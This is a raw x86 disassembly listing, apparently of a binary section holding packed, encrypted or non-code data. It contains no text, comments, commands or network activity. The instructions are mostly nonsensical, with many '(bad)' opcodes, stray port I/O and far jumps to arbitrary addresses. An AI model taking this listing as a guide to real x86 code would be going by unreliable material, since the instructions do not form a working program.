  40bdfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdfc:	popf   
  40bdfd:	or     eax,0x3fe6516
  40be02:	xchg   ecx,eax
  40be03:	xor    DWORD PTR [edi-0x33],ecx
  40be06:	push   edi
  40be07:	out    0x3b,eax
  40be09:	sbb    BYTE PTR [ecx+0x67],al
  40be0c:	stc    
  40be0d:	dec    edx
  40be0e:	aam    0x25
  40be10:	sbb    eax,0x5abd9d3c
  40be15:	cmp    al,0xa5
  40be17:	or     bh,bl
  40be19:	jno    0x40be23
  40be1b:	push   ecx
  40be1c:	xor    BYTE PTR [esi-0x329faaa],0x3d
  40be23:	jne    0x40bdc7
  40be25:	xor    bh,BYTE PTR [ebx+0x35]
  40be28:	push   ebp
  40be29:	sub    DWORD PTR [esi+0x14],esi
  40be2c:	inc    edi
  40be2d:	push   edi
  40be2e:	sub    eax,0x990efa9d
  40be33:	and    eax,0x284727f5
  40be38:	cdq    
  40be39:	lock mov al,0xcb
  40be3c:	pop    eax
  40be3d:	mov    ebx,DWORD PTR [edi-0x80]
  40be40:	mov    al,0xbc
  40be42:	scas   al,BYTE PTR es:[edi]
  40be43:	dec    esp
  40be44:	inc    esi
  40be45:	bound  esp,QWORD PTR [edx-0x458a2bbc]
  40be4b:	cmp    bl,BYTE PTR ds:0x951780dc
  40be51:	push   esi
  40be52:	imul   esp,DWORD PTR [ecx+0x27],0xffffffee
  40be56:	jno    0x40be8e
  40be58:	int    0x54
  40be5a:	daa    
  40be5b:	test   al,0x1d
  40be5d:	push   esp
  40be5e:	imul   ebx,DWORD PTR [esi+edi*2+0x767d58a3],0x453261a
  40be69:	jg     0x40bedc
  40be6b:	xchg   ebx,eax
  40be6c:	jmp    0x8352:0x61cca58f
  40be73:	jbe    0x40beb5
  40be75:	(bad)  
  40be76:	jmp    0xd9f4c778
  40be7b:	dec    ebx
  40be7c:	mov    ecx,0x7453ef9d
  40be81:	(bad)  
  40be83:	fdiv   QWORD PTR [eax+0xb]
  40be86:	sbb    ebx,edx
  40be88:	and    eax,0xe868ab0e
  40be8d:	sub    DWORD PTR [eax-0x4a3a172e],ebx
  40be93:	mov    dh,0x1a
  40be95:	(bad)  
  40be96:	adc    eax,0x42c1f761
  40be9b:	jmp    0x40be5c
  40be9d:	popf   
  40be9e:	je     0x40bf0c
  40bea0:	adc    dh,ah
  40bea2:	dec    eax
  40bea3:	out    0x96,eax
  40bea5:	and    al,0x58
  40bea7:	rcl    DWORD PTR [ecx],cl
  40bea9:	(bad)  
  40beaa:	sbb    al,0x51
  40beac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bead:	jo     0x40bf05
  40beaf:	pop    esp
  40beb0:	test   al,0xdb
  40beb2:	ja     0x40bec4
  40beb4:	mov    ebp,0xe6165e92
  40beb9:	jmp    0x40bf2e
  40bebb:	adc    BYTE PTR [ebx],0x2a
  40bebe:	inc    edx
  40bebf:	loopne 0x40bf31
  40bec1:	and    DWORD PTR [edx+0x7047eb74],ebx
  40bec7:	xchg   edi,eax
  40bec8:	in     eax,dx
  40bec9:	fisubr WORD PTR [ecx]
  40becb:	sar    BYTE PTR [ebx+0x76ee8b9f],1
  40bed1:	inc    edi
  40bed2:	daa    
  40bed3:	sbb    eax,0x23d85cf4
  40bed8:	add    al,0xae
  40beda:	mov    ds:0xb246dfe9,al
  40bedf:	cmc    
  40bee0:	jmp    0xbf56cae0
  40bee5:	les    eax,FWORD PTR [esi-0x4faaca35]
  40beeb:	mov    dl,0xac
  40beed:	rcr    DWORD PTR [ebp+0x4],0xd3
  40bef1:	leave  
  40bef2:	(bad)  
  40bef3:	jmp    0x40bf67
  40bef5:	and    eax,DWORD PTR [eax+edi*1]
  40bef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bef9:	mov    edx,0x61cf235a
  40befe:	jge    0x40bef9
  40bf00:	adc    eax,0x446e07d5
  40bf05:	pop    ss
  40bf06:	jle    0x40bf3c
  40bf08:	shl    BYTE PTR [esi+ebx*1],0xeb
  40bf0c:	sub    al,0xe2
  40bf0e:	mov    edi,0x199cd52e
  40bf13:	or     eax,0x9a37cb2
  40bf18:	sahf   
  40bf19:	jae    0x40bf3c
  40bf1b:	mov    DWORD PTR [edi+0x22],ebx
  40bf1e:	mov    dh,0x9b
  40bf20:	mov    ecx,0xc181fb47
  40bf25:	repnz sub ebp,DWORD PTR ds:0x8653eedb
  40bf2c:	xchg   ebp,eax
  40bf2d:	pop    eax
  40bf2e:	aad    0xe4
  40bf30:	mov    al,0xc7
  40bf32:	arpl   WORD PTR [edx+eax*8+0x7e],sp
  40bf36:	cmp    DWORD PTR [edx-0x48c4e3f9],edi
  40bf3c:	nop
  40bf3d:	loope  0x40bf47
  40bf3f:	sub    al,0x84
  40bf41:	sti    
  40bf42:	into   
  40bf43:	into   
  40bf44:	popf   
  40bf45:	mov    ebx,DWORD PTR [edx]
  40bf47:	inc    edx
  40bf48:	and    bl,dl
  40bf4a:	sahf   
  40bf4b:	lds    ecx,FWORD PTR [edx]
  40bf4d:	pop    edi
  40bf4e:	push   ebx
  40bf4f:	fbld   TBYTE PTR [edi]
  40bf51:	jb     0x40bf01
  40bf53:	jmp    0xd74f0cd9
  40bf58:	stos   BYTE PTR es:[edi],al
  40bf59:	shl    ebp,0x8a
  40bf5c:	stos   DWORD PTR es:[edi],eax
  40bf5d:	pusha  
  40bf5e:	push   edi
  40bf5f:	mov    ds:0x8fb03fb7,eax
  40bf64:	out    dx,eax
  40bf65:	ds pop ecx
  40bf67:	and    eax,0xa7b1b0ef
  40bf6c:	leave  
  40bf6d:	mov    ds:0xaba1518c,al
  40bf72:	jae    0x40bf5a
  40bf74:	jae    0x40bf5f
  40bf76:	or     dl,0xe5
  40bf79:	sub    ebp,DWORD PTR [edx+0x7a03696f]
  40bf7f:	xor    BYTE PTR [ecx+0x6d],al
  40bf82:	popf   
  40bf83:	mov    al,ds:0xac3a54d8
  40bf88:	sub    ebp,DWORD PTR [ebx+0x17f3d51c]
  40bf8e:	mov    edx,0xd673c527
  40bf93:	fdivr  QWORD PTR [edi-0x702b35f]
  40bf99:	or     DWORD PTR [edi],0x22
  40bf9c:	ret    0x919e
  40bf9f:	test   eax,0xdb2485e4
  40bfa4:	lahf   
  40bfa5:	xor    eax,0xaa90c5b
  40bfaa:	sub    BYTE PTR [ebp-0x666aefa9],bh
  40bfb0:	push   0xf513fc0e
  40bfb5:	sti    
  40bfb6:	sbb    ebx,ebp
  40bfb8:	scas   al,BYTE PTR es:[edi]
  40bfb9:	out    0x23,eax
  40bfbb:	into   
  40bfbc:	jne    0x40c018
  40bfbe:	test   al,0xe7
  40bfc0:	scas   al,BYTE PTR es:[edi]
  40bfc1:	jns    0x40c004
  40bfc3:	pop    esi
  40bfc4:	test   DWORD PTR [esi-0x5b],0x3fd01fff
  40bfcb:	pop    esi
  40bfcc:	xor    DWORD PTR [edi],esi
  40bfce:	sub    eax,0xfe2824b
  40bfd3:	std    
  40bfd4:	lods   eax,DWORD PTR ds:[esi]
  40bfd5:	bound  esi,QWORD PTR [esi-0x7c]
  40bfd8:	mov    al,0x1a
  40bfda:	mov    bl,0xee
  40bfdc:	add    BYTE PTR [eax+0x502f9103],ah
  40bfe2:	dec    eax
  40bfe3:	push   eax
  40bfe4:	popf   
  40bfe5:	jmp    0xfd9c58c5
  40bfea:	leave  
  40bfeb:	pop    ss
  40bfec:	test   BYTE PTR [esi+0x34],ch
  40bfef:	sub    ebx,eax
  40bff1:	stc    
  40bff2:	sbb    al,0x13
  40bff4:	xlat   BYTE PTR ds:[ebx]
  40bff5:	out    0xf3,al
  40bff7:	adc    ecx,esi
  40bff9:	dec    edx
  40bffa:	jl     0x40c036
  40bffc:	ja     0x40c02f
  40bffe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfff:	or     eax,esi
  40c001:	mov    ds:0x4d728939,eax
  40c006:	xchg   esi,eax
  40c007:	test   eax,0xb360840b
  40c00c:	(bad)  
  40c00e:	xor    eax,0xac8ff869
  40c013:	inc    ebx
  40c014:	or     BYTE PTR [esi],bl
  40c016:	cmp    BYTE PTR [edi+0x20],ah
  40c019:	pushf  
  40c01a:	mov    ds:0x74c9a551,al
  40c01f:	sbb    BYTE PTR ds:0x30d3eb63,0x60
  40c026:	inc    esi
  40c027:	dec    eax
  40c028:	pop    ebp
  40c029:	imul   edi,DWORD PTR [ebx-0x59ddb58c],0x727b1e26
  40c033:	test   al,0x35
  40c035:	lods   eax,DWORD PTR ds:[esi]
  40c036:	xlat   BYTE PTR ds:[ebx]
  40c037:	sti    
  40c038:	in     al,0x5c
  40c03a:	ins    BYTE PTR es:[edi],dx
  40c03b:	repnz inc ecx
  40c03d:	add    eax,DWORD PTR [ecx+0x5cdb6f32]
  40c043:	inc    ebx
  40c044:	aam    0x18
  40c046:	xchg   ebx,eax
  40c047:	(bad)  
  40c048:	xlat   BYTE PTR ds:[ebx]
  40c049:	dec    esi
  40c04a:	and    DWORD PTR [edi+0x79],0x8056e37a
  40c051:	xchg   ebp,eax
  40c052:	mov    cs,WORD PTR [ebx+0x2c7c6397]
  40c058:	pop    esp
  40c059:	sbb    BYTE PTR [edx+0x757fd7e9],dh
  40c05f:	int3   
  40c060:	sub    BYTE PTR [edi],bh
  40c062:	cmc    
  40c063:	pop    ebp
  40c064:	push   eax
  40c065:	cs aad 0xe5
  40c068:	inc    ebp
  40c069:	retf   
  40c06a:	fsubrp st(7),st
  40c06c:	pusha  
  40c06d:	shr    ch,0x70
  40c070:	out    dx,eax
  40c071:	in     eax,0xd9
  40c073:	icebp  
  40c074:	push   ss
  40c075:	fwait
  40c076:	pushf  
  40c077:	add    esp,esp
  40c079:	aam    0xf1
  40c07b:	mov    esi,0xce660e6f
  40c080:	mov    esi,0xfe39c39d
  40c085:	aaa    
  40c086:	stos   BYTE PTR es:[edi],al
  40c087:	mov    ds:0x5536c525,eax
  40c08c:	sbb    al,0x37
  40c08e:	iret   
  40c08f:	and    al,0xbb
  40c091:	xor    BYTE PTR ds:0x81736f16,ch
  40c097:	fist   WORD PTR [eax+eiz*2]
  40c09a:	pop    edi
  40c09b:	jb     0x40c0bc
  40c09d:	bound  edx,QWORD PTR [edx-0x580840c]
  40c0a3:	leave  
  40c0a4:	cmp    DWORD PTR [esi+0x2a],ebx
  40c0a7:	mov    dh,BYTE PTR [ebx+0x73aa616a]
  40c0ad:	mov    esi,ss
  40c0af:	push   edx
  40c0b0:	mov    gs,WORD PTR [eax]
  40c0b2:	inc    esp
  40c0b3:	add    BYTE PTR [esi-0x69],ah
  40c0b6:	inc    ebp
  40c0b7:	cmp    BYTE PTR [ebp-0x1a],0xd2
  40c0bb:	in     eax,0x9a
  40c0bd:	popa   
  40c0be:	jne    0x40c130
  40c0c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0c1:	sub    cl,BYTE PTR [edi]
  40c0c3:	and    BYTE PTR es:[esi+edi*4+0x54dbe1d7],bh
  40c0cb:	cmp    al,0xd1
  40c0cd:	call   0xc67e:0x4423a0ee
  40c0d4:	mov    al,ds:0xf7782b7f
  40c0d9:	pop    ecx
  40c0da:	lods   al,BYTE PTR ds:[esi]
  40c0db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0dc:	pop    eax
  40c0dd:	mov    BYTE PTR [esi],ch
  40c0df:	lods   al,BYTE PTR ds:[esi]
  40c0e0:	cld    
  40c0e1:	test   dh,bl
  40c0e3:	(bad)  
  40c0e4:	pop    edi
  40c0e5:	daa    
  40c0e6:	mov    edi,DWORD PTR [ecx]
  40c0e8:	jl     0x40c127
  40c0ea:	sbb    edx,DWORD PTR [esi]
  40c0ec:	sbb    eax,0x59fe7c19
  40c0f1:	in     eax,0xec
  40c0f3:	aad    0xea
  40c0f5:	sub    DWORD PTR [ebp+0x4155c036],ebx
  40c0fb:	jecxz  0x40c0bf
  40c0fd:	and    ebp,DWORD PTR [ebp-0x3]
  40c100:	sub    ebx,edx
  40c102:	(bad)  
  40c103:	mov    esp,0xa8860e6d
  40c108:	add    dh,BYTE PTR [ebp-0x40]
  40c10b:	pop    ebp
  40c10c:	sbb    al,0xe
  40c10e:	dec    edi
  40c10f:	inc    edi
  40c110:	xchg   esi,eax
  40c111:	xor    DWORD PTR [ebp+0x5f],edx
  40c114:	not    BYTE PTR [ebp-0x344718bb]
  40c11a:	cli    
  40c11b:	sbb    al,0xe4
  40c11d:	dec    ebx
  40c11e:	out    0xd1,al
  40c120:	jae    0x40c149
  40c122:	xchg   DWORD PTR [eax],ebp
  40c124:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c125:	push   ebx
  40c126:	out    0xae,al
  40c128:	adc    al,0x11
  40c12a:	push   ds
  40c12b:	add    al,0xc1
  40c12d:	adc    ah,BYTE PTR [esi]
  40c12f:	(bad)  
  40c130:	call   0x1fdc:0xfc24bb5d
  40c137:	enter  0x6698,0x2c
  40c13b:	sbb    ecx,DWORD PTR [ecx+0x49c9a5b7]
  40c141:	push   ds
  40c142:	mov    ch,0x6d
  40c144:	idiv   DWORD PTR [ebx]
  40c146:	mov    ah,BYTE PTR [ecx+0x671bb5eb]
  40c14c:	inc    ecx
  40c14d:	pusha  
  40c14e:	into   
  40c14f:	(bad)  [ecx-0x6e0b6042]
  40c155:	push   ebp
  40c156:	sub    eax,0x676f5862
  40c15b:	int3   
  40c15c:	mov    BYTE PTR [esi-0x4dad7169],0x1b
  40c163:	mov    dl,0xa4
  40c165:	aam    0xd0
  40c167:	or     ecx,ebx
  40c169:	sahf   
  40c16a:	jns    0x40c1a6
  40c16c:	cmp    al,0x29
  40c16e:	add    BYTE PTR [esi-0x7b6f958],bl
  40c174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c175:	(bad)  
  40c176:	cmp    cl,cl
  40c178:	add    al,0x34
  40c17a:	imul   esp,esi,0xffffffeb
  40c17d:	mov    esp,0x98a1c19b
  40c182:	push   esi
  40c183:	test   eax,0x32907fc7
  40c188:	dec    ecx
  40c189:	pusha  
  40c18a:	(bad)  [esi]
  40c18c:	stos   BYTE PTR es:[edi],al
  40c18d:	mov    edx,0xdc93d178
  40c192:	imul   edx,DWORD PTR [edx+0x66],0x16e78fb8
  40c199:	pop    esi
  40c19a:	sub    ch,BYTE PTR [eax-0x76397c6a]
  40c1a0:	lds    esp,FWORD PTR [eax+0x7dff097f]
  40c1a6:	jae    0x40c128
  40c1a8:	ds scas eax,DWORD PTR es:[edi]
  40c1aa:	fbld   TBYTE PTR [edx-0x74]
  40c1ad:	rcr    BYTE PTR [eax+0x984bbbf],0xb7
  40c1b4:	rcr    dl,0x42
  40c1b7:	inc    ecx
  40c1b8:	push   ss
  40c1b9:	jg     0x40c21f
  40c1bb:	aad    0xe2
  40c1bd:	cmp    DWORD PTR [ebx+0xe],esp
  40c1c0:	imul   DWORD PTR [esi+0x4f0b67c1]
  40c1c6:	xor    al,bh
  40c1c8:	and    eax,0x58ab6b45
  40c1cd:	jge    0x40c1c2
  40c1cf:	xor    al,0xc4
  40c1d1:	ror    esi,0xdf
  40c1d4:	and    esp,esp
  40c1d6:	sub    ebp,edx
  40c1d8:	jnp    0x40c17f
  40c1da:	je     0x40c1c4
  40c1dc:	(bad)  
  40c1dd:	test   eax,0x21adf7db
  40c1e2:	test   DWORD PTR [edx+0x6bbfb604],0x21684ef8
  40c1ec:	mov    eax,0xec7e9855
  40c1f1:	xchg   ebx,eax
  40c1f2:	push   edi
  40c1f3:	mov    bh,0x3e
  40c1f5:	or     ebp,DWORD PTR [esi-0x6b912ce7]
  40c1fb:	mov    dh,BYTE PTR [esi-0x45]
  40c1fe:	push   ebx
  40c1ff:	mov    esp,0x21c7c5b0
  40c204:	out    0xb6,al
  40c206:	lea    esp,[esi-0x307cdfb3]
  40c20c:	out    dx,al
  40c20d:	dec    eax
  40c20e:	sub    ebx,0xffffffc2
  40c211:	popa   
  40c212:	(bad)  
  40c213:	aad    0xa
  40c215:	hlt    
  40c216:	lds    esp,FWORD PTR [ebx+eiz*4+0x78]
  40c21a:	es and eax,0x1c1e820f
  40c220:	rcl    DWORD PTR [esi*4+0x25afed5c],0xb8
  40c228:	sbb    BYTE PTR [ebx-0x5e],dh
  40c22b:	pop    ds
  40c22c:	in     eax,dx
  40c22d:	sbb    bh,BYTE PTR [esi]
  40c22f:	and    al,0x93
  40c231:	jns    0x40c1bf
  40c233:	(bad)
  40c236:	hlt    
  40c237:	sub    dh,BYTE PTR [eax+0x5]
  40c23a:	or     BYTE PTR [ebx-0x77faac3d],0x29
  40c241:	mov    bl,0xe9
  40c243:	into   
  40c244:	int3   
  40c245:	cs cmp dh,cl
  40c248:	bound  edi,QWORD PTR [edi+0x3d]
  40c24b:	cmp    bh,BYTE PTR [ecx]
  40c24d:	mov    cl,0x49
  40c24f:	or     bh,BYTE PTR [edx]
  40c251:	push   0xffffff80
  40c253:	dec    eax
  40c254:	into   
  40c255:	and    DWORD PTR [edx+0x23],ebp
  40c258:	xchg   BYTE PTR [ebp-0x7b0e32d],dl
  40c25e:	fucomip st,st(3)
  40c260:	aad    0x16
  40c262:	mov    BYTE PTR [edx+0x25e8f018],dl
  40c268:	jo     0x40c2cc
  40c26a:	in     al,dx
  40c26b:	push   ss
  40c26c:	icebp  
  40c26d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c26e:	add    edi,DWORD PTR [edx-0x5b]
  40c271:	std    
  40c272:	xor    edi,DWORD PTR [esi-0x4d7f9b20]
  40c278:	in     eax,0xbb
  40c27a:	loope  0x40c231
  40c27c:	sbb    BYTE PTR [edx-0x23],cl
  40c27f:	and    al,bl
  40c281:	or     BYTE PTR [ebp-0x31344336],al
  40c287:	shl    dh,1
  40c289:	dec    edx
  40c28a:	push   0xa603a95f
  40c28f:	push   ecx
  40c290:	call   0x8f6d:0xf53fb62d
  40c297:	cmovo  esp,ecx
  40c29a:	push   esp
  40c29b:	fistp  WORD PTR ds:0xc239468f
  40c2a1:	in     eax,0x84
  40c2a3:	test   eax,0x3b265279
  40c2a8:	leave  
  40c2a9:	fstp   st(2)
  40c2ab:	cdq    
  40c2ac:	ror    BYTE PTR [ebx-0x65efeb82],cl
  40c2b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2b3:	inc    eax
  40c2b4:	mov    WORD PTR [ebx+ecx*2],gs
  40c2b7:	das    
  40c2b8:	je     0x40c23b
  40c2ba:	mov    dh,0xc2
  40c2bc:	push   cs
  40c2bd:	cli    
  40c2be:	mov    ebx,0x9edac42c
  40c2c3:	(bad)  
  40c2c5:	xchg   edx,eax
  40c2c6:	and    BYTE PTR [esi+edx*4-0x347253c5],ah
  40c2cd:	dec    ebp
  40c2ce:	xor    ah,BYTE PTR [ecx+0x2ec44e2f]
  40c2d4:	push   ebp
  40c2d5:	inc    ebx
  40c2d6:	xlat   BYTE PTR ds:[ebx]
  40c2d7:	mov    eax,0xa5df158
  40c2dc:	sub    edi,DWORD PTR [ebx+0x63]
  40c2df:	fstp   TBYTE PTR [ecx-0x7161ea30]
  40c2e5:	xor    al,0x76
  40c2e7:	jge    0x40c33d
  40c2e9:	neg    DWORD PTR [ecx+edi*8-0x6d]
  40c2ed:	pop    edx
  40c2ee:	sbb    BYTE PTR [esi-0x61],bh
  40c2f1:	adc    BYTE PTR [edx-0x80],bh
  40c2f4:	ja     0x40c30a
  40c2f6:	(bad)  
  40c2f7:	jno    0x40c32a
  40c2f9:	cld    
  40c2fa:	sbb    DWORD PTR es:[eax+0x44],0xffffffa2
  40c2ff:	int    0x30
  40c301:	ret    
  40c302:	loop   0x40c355
  40c304:	cmp    ebx,eax
  40c306:	ins    DWORD PTR es:[edi],dx
  40c307:	fist   WORD PTR [ebx-0x1ffa9a8d]
  40c30d:	xchg   ecx,eax
  40c30e:	push   edi
  40c30f:	out    dx,al
  40c310:	or     ebx,DWORD PTR [ecx+0x7b]
  40c313:	mov    DWORD PTR [ebx],edi
  40c315:	jg     0x40c2ce
  40c317:	jl     0x40c29a
  40c319:	xchg   ebx,eax
  40c31a:	lock xor esi,ebp
  40c31d:	imul   ebx,DWORD PTR [ebp+0x5f],0xffffffb3
  40c321:	cs iret 
  40c323:	loopne 0x40c36c
  40c325:	out    dx,al
  40c326:	out    dx,al
  40c327:	mov    bh,0x9e
  40c329:	dec    eax
  40c32a:	push   0x67
  40c32c:	add    BYTE PTR [ebp+0x27c423e6],bh
  40c332:	push   0xffffff9c
  40c334:	inc    edi
  40c335:	int3   
  40c336:	pop    ss
  40c337:	push   es
  40c338:	push   0xa08fc4b8
  40c33d:	adc    DWORD PTR cs:[edi-0x33ce16fb],edi
  40c344:	stos   BYTE PTR es:[edi],al
  40c345:	shr    eax,1
  40c347:	cld    
  40c348:	jl     0x40c32b
  40c34a:	mov    ds:0xd0d8e0ec,al
  40c34f:	in     al,0x2e
  40c351:	(bad)  
  40c352:	in     eax,dx
  40c353:	adc    esi,ebx
  40c355:	dec    eax
  40c356:	das    
  40c357:	sti    
  40c358:	std    
  40c359:	sti    
  40c35a:	dec    eax
  40c35b:	lock int3 
  40c35d:	mov    DWORD PTR [ecx+0x69],edi
  40c360:	fsub   QWORD PTR [edi+0x5a]
  40c363:	imul   eax,DWORD PTR [ecx],0x78233270
  40c369:	cmp    edi,DWORD PTR [eax+0x74]
  40c36c:	push   esi
  40c36d:	(bad)  
  40c36e:	push   0xffffff96
  40c370:	sub    DWORD PTR [ecx+0x69252029],0x22c65f7b
  40c37a:	retf   
  40c37b:	lods   al,BYTE PTR ds:[esi]
  40c37c:	jbe    0x40c36f
  40c37e:	mov    ebx,0xffb80bd9
  40c383:	adc    BYTE PTR [ecx+ecx*4+0x3e],bl
  40c387:	pop    es
  40c388:	xchg   edx,eax
  40c389:	or     dh,BYTE PTR [edi]
  40c38b:	push   esp
  40c38c:	loop   0x40c33c
  40c38e:	push   esp
  40c38f:	cwde   
  40c390:	test   DWORD PTR [esi-0x27f86f6e],0xb7562421
  40c39a:	jne    0x40c377
  40c39c:	mov    ds:0xd631a5a2,eax
  40c3a1:	add    al,0x1e
  40c3a3:	jp     0x40c345
  40c3a5:	xor    bh,ch
  40c3a7:	es (bad) 
  40c3a9:	leave  
  40c3aa:	xchg   esi,eax
  40c3ab:	test   BYTE PTR [ecx+0x33cf2ccf],dl
  40c3b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3b2:	xchg   ebp,eax
  40c3b3:	fcmovnbe st,st(0)
  40c3b5:	sbb    al,0x95
  40c3b7:	popa   
  40c3b8:	xor    DWORD PTR [ecx],esi
  40c3ba:	or     eax,0x992039e3
  40c3bf:	dec    ecx
  40c3c0:	xchg   DWORD PTR ds:0xf7d29cea,ebx
  40c3c6:	ds jmp 0x9877:0x3fe50c3d
  40c3ce:	js     0x40c402
  40c3d0:	xor    dh,BYTE PTR [edi+0x7838afe8]
  40c3d6:	mov    DWORD PTR [edx-0x6e],eax
  40c3d9:	into   
  40c3da:	inc    edx
  40c3db:	mov    esi,DWORD PTR [edx-0x6c2e8cc1]
  40c3e1:	push   ds
  40c3e2:	mov    al,0x76
  40c3e4:	jmp    0xf0018ed3
  40c3e9:	mov    dh,0xb6
  40c3eb:	(bad)  
  40c3ec:	xor    eax,0xfb61053d
  40c3f1:	xor    BYTE PTR [ebx],bh
  40c3f3:	sar    BYTE PTR [ebx+ebx*4+0x64bad85e],0x2
  40c3fb:	inc    ecx
  40c3fc:	dec    DWORD PTR [esi]
  40c3fe:	mov    ds:0xaa6ff57a,eax
  40c403:	sbb    edi,0x31
  40c406:	jecxz  0x40c3a1
  40c408:	imul   ebp,DWORD PTR [eax],0xd2069b5f
  40c40e:	cmp    edi,DWORD PTR [esi+0x24]
  40c411:	add    al,0xed
  40c413:	cld    
  40c414:	pop    edi
  40c415:	std    
  40c416:	or     edi,DWORD PTR [edi-0x78]
  40c419:	pop    esp
  40c41a:	and    BYTE PTR [edx-0x73a2dfd2],cl
  40c420:	mov    ah,0xc3
  40c422:	inc    edx
  40c423:	test   DWORD PTR [eax-0x24],0x747affd7
  40c42a:	pop    ebp
  40c42b:	mov    cl,0xfd
  40c42d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c42e:	pop    edx
  40c42f:	fld    QWORD PTR ds:0xac5cb67f
  40c435:	push   ebx
  40c436:	clc    
  40c437:	inc    edi
  40c438:	dec    eax
  40c439:	arpl   bp,bp
  40c43b:	mov    dh,0x3e
  40c43d:	div    eax
  40c43f:	or     DWORD PTR [eax],0xc36ffa31
  40c445:	repnz xchg ebp,eax
  40c447:	icebp  
  40c448:	xchg   ebp,eax
  40c449:	jmp    0xddd:0x12b14024
  40c450:	es dec ebx
  40c452:	(bad)  
  40c453:	cmp    al,0x7d
  40c455:	in     al,0xd6
  40c457:	into   
  40c458:	mov    eax,0xe56cc7fc
  40c45d:	retf   0xc607
  40c460:	xchg   edi,eax
  40c461:	rcr    BYTE PTR [edx+esi*8],1
  40c464:	cld    
  40c465:	sbb    ecx,DWORD PTR [ebp+0x6a]
  40c468:	cmp    al,dl
  40c46a:	ret    0x310b
  40c46d:	jns    0x40c4c2
  40c46f:	inc    edx
  40c470:	dec    ebp
  40c471:	test   BYTE PTR [esi+0x1],bl
  40c474:	js     0x40c496
  40c476:	add    ch,BYTE PTR [eax-0x55]
  40c479:	xor    edx,DWORD PTR [ebx-0x1e]
  40c47c:	iret   
  40c47d:	jns    0x40c420
  40c47f:	xor    DWORD PTR [ecx],esp
  40c481:	jge    0x40c44e
  40c483:	data16 fs in al,dx
  40c486:	hlt    
  40c487:	out    dx,al
  40c488:	ficom  DWORD PTR [ebx-0x22]
  40c48b:	sub    eax,0x21e546b
  40c490:	jl     0x40c425
  40c492:	and    DWORD PTR [edi+0xca],0x0
	...
  40c514:	es ss pop ecx
  40c517:	sbb    BYTE PTR [ecx+0x7f],bl
  40c51a:	addr16 ds loope 0x40c540
  40c51e:	dec    edx
  40c51f:	inc    esp
  40c520:	aaa    
  40c521:	in     eax,0x32
  40c523:	sub    al,0xf3
  40c525:	je     0x40c527
  40c527:	add    BYTE PTR [ecx+0x7],ch
  40c52a:	add    BYTE PTR [eax],al
  40c52c:	(bad)  
  40c52d:	mov    esp,0x9d0e76aa
  40c532:	loopne 0x40c5a3
  40c534:	ret    
  40c535:	push   es
  40c536:	lahf   
  40c537:	adc    eax,0xb3622a3f
  40c53c:	mov    WORD PTR gs:[ebx-0x47616e22],gs
  40c543:	sbb    BYTE PTR [ecx],dh
  40c545:	xchg   ebx,eax
  40c546:	jo     0x40c5c0
  40c548:	out    0xcf,eax
  40c54a:	aad    0xd7
  40c54c:	je     0x40c582
  40c54e:	repnz add esi,esi
  40c551:	xchg   ebx,eax
  40c552:	or     eax,0x9bd8b6c5
  40c557:	rcr    DWORD PTR [eax+0x51],1
  40c55a:	and    BYTE PTR [ebp+0x31c82c33],ah
  40c560:	arpl   WORD PTR [esi-0x437c347c],bx
  40c566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c567:	xchg   esi,eax
  40c568:	sbb    al,0x64
  40c56a:	jecxz  0x40c58c
  40c56c:	sahf   
  40c56d:	repnz add DWORD PTR ds:0xa2e2f1c2,ecx
  40c574:	and    al,0x97
  40c576:	pop    ds
  40c577:	in     al,0xd0
  40c579:	cs xchg esp,eax
  40c57b:	and    al,0xd5
  40c57d:	mov    ds:0x5d4ab043,al
  40c582:	lods   eax,DWORD PTR ds:[esi]
  40c583:	add    ecx,ecx
  40c585:	sub    DWORD PTR [edx+0x1800055c],eax
  40c58b:	jle    0x40c597
  40c58d:	pop    ebx
  40c58e:	shr    esi,cl
  40c590:	xor    DWORD PTR gs:[esi],0xffffffda
  40c594:	in     eax,0x1f
  40c596:	pop    eax
  40c597:	sbb    dh,al
  40c599:	dec    ecx
  40c59a:	jae    0x40c56b
  40c59c:	mov    eax,ds:0xb0b59f3b
  40c5a1:	out    dx,al
  40c5a2:	pushf  
  40c5a3:	scas   al,BYTE PTR es:[edi]
  40c5a4:	dec    ecx
  40c5a5:	cli    
  40c5a6:	push   eax
  40c5a7:	xor    esp,edi
  40c5a9:	jl     0x40c5e4
  40c5ab:	(bad)  
  40c5ac:	pop    ebp
  40c5ad:	xlat   BYTE PTR ds:[ebx]
  40c5ae:	push   esi
  40c5af:	xor    ebx,DWORD PTR [ecx+0x1a28bd7e]
  40c5b5:	loop   0x40c5e4
  40c5b7:	fbld   TBYTE PTR ds:0xeff27a0
  40c5bd:	mov    bl,0x48
  40c5bf:	lahf   
  40c5c0:	bound  ecx,QWORD PTR [edi+0x59fbd255]
  40c5c6:	mov    ebx,0xc7286b37
  40c5cb:	cmp    ch,BYTE PTR [esi-0xf]
  40c5ce:	dec    esp
  40c5cf:	xchg   ecx,eax
  40c5d0:	mov    esi,0x6b2944ee
  40c5d5:	jge    0x40c579
  40c5d7:	jns    0x40c597
  40c5d9:	mov    ch,0xe8
  40c5db:	mov    ebp,DWORD PTR [ebp+0x4fd7838]
  40c5e1:	mov    al,ds:0x54cbe59c
  40c5e6:	enter  0x67d1,0xc4
  40c5ea:	mov    dh,0x72
  40c5ec:	push   edi
  40c5ed:	pop    esi
  40c5ee:	push   edi
  40c5ef:	add    ah,BYTE PTR [ebp+0x8003308]
  40c5f5:	xor    edi,ebx
  40c5f7:	push   esi
  40c5f8:	cld    
  40c5f9:	adc    ah,BYTE PTR [edi+0x1f]
  40c5fc:	ins    BYTE PTR es:[edi],dx
  40c5fd:	in     al,dx
  40c5fe:	adc    al,al
  40c600:	xchg   esp,eax
  40c601:	pop    ebp
  40c602:	outs   dx,DWORD PTR ds:[esi]
